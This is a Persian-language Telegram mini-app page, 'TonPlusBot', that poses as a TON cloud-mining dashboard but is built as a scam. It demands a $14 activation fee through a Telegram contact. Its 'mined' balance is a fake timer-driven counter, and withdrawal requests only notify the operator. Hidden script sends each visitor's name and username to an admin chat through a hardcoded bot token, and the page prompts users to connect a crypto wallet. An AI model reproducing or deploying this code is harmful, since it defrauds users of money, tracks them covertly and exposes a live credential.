<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TonPlusBot - v39 Final Harmony</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
        }

        /* استایل کارت پروفایل و عکس کاربر */
        .card-profile {
            background: #161d27; border-radius: 20px; padding: 15px;
            margin-bottom: 12px; border: 1px solid #242c37;
            display: flex; align-items: center; gap: 15px;
        }

        .avatar-box { 
            width: 60px; height: 60px; border-radius: 50%; 
            background: #242c37; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            border: 2px solid #00c6ff;
        }

        .avatar-box img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .avatar-box i { font-size: 30px; color: #00c6ff; }

        /* استایل بدنه کارت‌ها */
        .card {
            background: #161d27; border-radius: 20px; padding: 20px;
            margin-bottom: 12px; border: 1px solid #242c37; text-align: center;
        }

        #balance { font-size: 42px; font-weight: 800; color: #00c6ff; display: block; margin: 5px 0; }

        /* دکمه‌های یکپارچه و هماهنگ (Full Width) */
        .btn {
            width: 100%; height: 56px; border-radius: 20px; border: none;
            font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
            align-items: center; justify-content: center; gap: 10px; color: #fff; 
            text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
        }

        /* اصلاح اختصاصی دکمه TonConnect برای هماهنگی کامل */
        #ton-connect-btn { width: 100%; display: flex; justify-content: center; }
        #ton-connect-btn * { 
            width: 100% !important; 
            height: 56px !important; 
            border-radius: 20px !important; 
            justify-content: center !important;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
        .support-btn { background: #242c37; border: 1px solid #333; }
        .active-btn { background: #1faa59; }
        .get-code-btn { background: #0088cc; }

        /* پاپ‌آپ فعالسازی مطابق تصویر ۲ */
        #feeModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
        }

        .modal-content {
            background: #161d27; padding: 25px 15px; border-radius: 25px; width: 90%; text-align: center;
            border: 1px solid #242c37;
        }

        .pay-notice {
            background: rgba(255, 193, 7, 0.05); border: 1.5px solid #ffc107;
            color: #ffc107; padding: 15px; border-radius: 15px; font-size: 11px; margin-bottom: 20px;
        }

        .fee-highlight { border: 2px dashed #00ff9d; color: #00ff9d; padding: 12px; border-radius: 15px; font-weight: 800; margin: 15px 0; display: block; }

        #activationInput {
            width: 100%; height: 56px; border-radius: 18px; border: 1px solid #333;
            background: #0b1019; color: #fff; text-align: center; font-size: 16px; margin-bottom: 12px; outline: none;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="feeModal">
    <div class="modal-content">
        <i class="fas fa-lock" style="font-size: 50px; color: #ff512f; margin-bottom: 20px;"></i>
        <h2 style="font-size: 19px; margin-bottom: 10px;">فعالسازی پنل کاربری</h2>
        <div class="pay-notice">جهت واریز کارمزد فقط از پشتیبانی اطلاعات بگیرید.</div>
        <div class="fee-highlight">14 دلار | 2,226,000 تومان</div>
        <a href="https://t.me/miningertoncoin" class="btn get-code-btn">دریافت رمز و واریز</a>
        <input type="text" id="activationInput" placeholder="Enter Code">
        <button onclick="verifyActivation()" class="btn active-btn">فعالسازی و ورود</button>
    </div>
</div>

<div class="card-profile">
    <div class="avatar-box" id="userAvatarBox">
        <i class="fas fa-user" id="defaultIcon"></i>
        <img id="userPhoto" class="hidden" alt="Profile">
    </div>
    <div style="text-align: right;">
        <h3 id="userName" style="margin:0; font-size:15px;">...</h3>
        <p id="userTag" style="margin:0; font-size:12px; color:#00c6ff;">@username</p>
    </div>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
    <span id="balance">0.000000</span>
    <div style="font-size:11px; color:#00ff9d; margin-top:8px;"><i class="fas fa-bolt"></i> استخراج ابری فعال</div>
</div>

<div class="card">
    <div id="ton-connect-btn"></div>
</div>

<div style="padding: 0 5px;">
    <button id="withdrawBtn" class="btn withdraw-btn">
        <i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی
    </button>
    <a href="https://t.me/miningertoncoin" class="btn support-btn">
        <i class="fas fa-headset"></i> پشتیبانی آنلاین
    </a>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const SECRET_CODE = "T61O96N12";
    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";

    function logToAdmin(msg) {
        const user = tg.initDataUnsafe?.user;
        const info = user ? `\n👤: ${user.first_name}\n🆔: @${user.username || user.id}` : "";
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg + info)}&parse_mode=HTML`);
    }

    if(localStorage.getItem('isActivated') === 'true') {
        document.getElementById('feeModal').style.display = 'none';
        logToAdmin("⛏️ <b>کاربر وارد صفحه استخراج شد</b>");
    } else {
        logToAdmin("🚨 <b>کاربر در صفحه پرداخت است</b>");
    }

    function verifyActivation() {
        if(document.getElementById('activationInput').value.trim() === SECRET_CODE) {
            localStorage.setItem('isActivated', 'true');
            document.getElementById('feeModal').remove();
            logToAdmin("🔓 <b>پنل فعال شد</b>");
        } else { tg.showAlert("رمز اشتباه ❌"); }
    }

    // سیستم لود پروفایل و عکس
    const user = tg.initDataUnsafe?.user;
    if (user) {
        document.getElementById('userName').innerText = user.first_name || "User";
        document.getElementById('userTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
        if (user.photo_url) {
            const img = document.getElementById('userPhoto');
            img.src = user.photo_url;
            img.onload = () => {
                img.classList.remove('hidden');
                document.getElementById('defaultIcon').classList.add('hidden');
            };
        }
    }

    // استخراج
    let bal = parseFloat(localStorage.getItem('bal_v39')) || 0;
    setInterval(() => {
        bal += 0.000012;
        document.getElementById('balance').innerText = bal.toFixed(6);
        localStorage.setItem('bal_v39', bal.toString());
    }, 1000);

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-btn'
    });

    document.getElementById('withdrawBtn').onclick = () => {
        if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا فعال کنید");
        if(!tonConnectUI.connected) return tg.showAlert("ولت وصل نیست");
        logToAdmin(`💰 <b>برداشت:</b> ${bal.toFixed(6)} TON`);
        tg.showAlert("ثبت شد ✅");
    };
</script>
</body>
</html>
